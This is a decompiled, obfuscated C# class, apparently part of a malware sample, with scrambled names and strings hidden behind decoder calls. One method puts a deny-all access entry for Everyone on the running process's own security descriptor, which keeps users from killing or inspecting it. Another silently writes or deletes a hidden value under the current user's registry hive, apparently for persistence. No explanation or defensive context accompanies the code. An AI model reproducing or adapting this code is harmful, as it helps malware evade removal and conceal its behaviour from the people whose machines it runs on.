using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fTOyYuFiHboGKe;

internal sealed class qHHwkVIRhGNyzQt
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr omeyqhmlkEAoI, int mxYDTxdrUxQbgavm, [Out] byte[] iZHbwNSmAjFBU, uint sByeDcMPGJUfj, out uint tOMwCwMabAh);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr ESLBSPKxjvNUFJ, int BRfBviYQplhQ, [In] byte[] azRGkEolTZDL);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void MSUsABVfQUW(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(getString_0(107406618));
			if (bool_0 && registryKey.GetValue(getString_0(107407021)) != null)
			{
				registryKey.DeleteValue(getString_0(107407021));
			}
			else
			{
				registryKey.SetValue(getString_0(107407021), getString_0(107407915));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor miJZSynLCnzxB(IntPtr intptr_0)
	{
		byte[] iZHbwNSmAjFBU = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, iZHbwNSmAjFBU, 0u, out var tOMwCwMabAh);
		if ((long)tOMwCwMabAh > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, iZHbwNSmAjFBU = new byte[tOMwCwMabAh], tOMwCwMabAh, out tOMwCwMabAh))
		{
			return null;
		}
		return new RawSecurityDescriptor(iZHbwNSmAjFBU, 0);
	}

	private void TBlKYhupceHkG(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void DngMxZMkNlBkNCpI()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = miJZSynLCnzxB(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			TBlKYhupceHkG(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static qHHwkVIRhGNyzQt()
	{
		Strings.CreateGetStringDelegate(typeof(qHHwkVIRhGNyzQt));
	}
}
